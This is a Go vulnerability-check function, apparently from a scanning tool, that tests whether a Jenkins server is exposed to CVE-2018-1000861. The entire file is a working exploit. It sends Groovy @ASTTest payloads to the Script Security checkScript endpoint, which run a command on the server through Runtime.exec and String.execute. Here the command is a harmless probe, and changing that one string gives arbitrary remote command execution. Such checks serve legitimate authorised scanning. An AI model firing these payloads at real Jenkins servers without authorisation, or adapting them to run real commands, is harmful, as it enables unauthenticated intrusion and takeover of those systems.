package jenkins

import (
	"github.com/yhy0/Jie/pkg/protocols/http"
	"strings"
)

func CVE_2018_1000861(u string) bool {
	if req, err := http.Request(u, "GET", "", false, nil); err == nil {
		if req.Header.Get("X-Jenkins-Session") != "" {
			if req2, err := http.Request(u+"/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=import+groovy.transform.*%0a%40ASTTest(value%3d%7bassert+java.lang.Runtime.getRuntime().exec(%22vtest%22)%7d)%0aclass+Person%7b%7d", "POST", "", false, nil); err == nil {
				if req2.StatusCode == 500 && strings.Contains(req2.Body, "No such file or directory") {
					return true
				}
			}
			if req3, err := http.Request(u+"/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=import+groovy.transform.*%0a%40ASTTest(value%3d%7b+%22vtest%22.execute().text+%7d)%0aclass+Person%7b%7d", "POST", "", false, nil); err == nil {
				if req3.StatusCode == 500 && strings.Contains(req3.Body, "No such file or directory") {
					return true
				}
			}
		}
	}
	return false
}
